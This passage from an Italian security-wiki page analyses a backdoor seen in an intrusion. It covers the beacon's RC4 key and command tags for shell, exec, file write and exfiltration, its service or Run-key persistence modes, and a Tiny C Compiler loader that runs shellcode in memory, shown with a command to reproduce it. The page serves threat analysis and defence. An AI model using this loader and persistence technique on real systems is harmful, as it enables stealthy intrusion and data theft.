- I beacon costruiscono un profilo host delimitato da punti, antepongono il tag `4Q`, poi lo RC4-encryptano con la chiave `vAuig34%^325hGV` prima di `HttpSendRequestA` su HTTPS. Le risposte vengono decriptate con RC4 e smistate da uno switch sui tag (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + casi di trasferimento a chunk).
- La modalità di esecuzione è controllata dagli argomenti CLI: nessun argomento = installa persistenza (service/Run key) che punta a `-i`; `-i` rilancia se stesso con `-k`; `-k` salta l'installazione e esegue il payload.

Loader alternativo osservato
- La stessa intrusione ha droppato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` accanto. Il codice C fornito dall'attaccante incorporava shellcode, lo compilava ed eseguiva in memoria senza toccare il disco con un PE. Riprodurre con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Questa fase compile-and-run basata su TCC ha importato `Wininet.dll` a runtime e ha scaricato uno shellcode di secondo stadio da un hardcoded URL, fornendo un loader flessibile che si spaccia per un'esecuzione del compilatore.

## Riferimenti

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../../banners/hacktricks-training.md}}
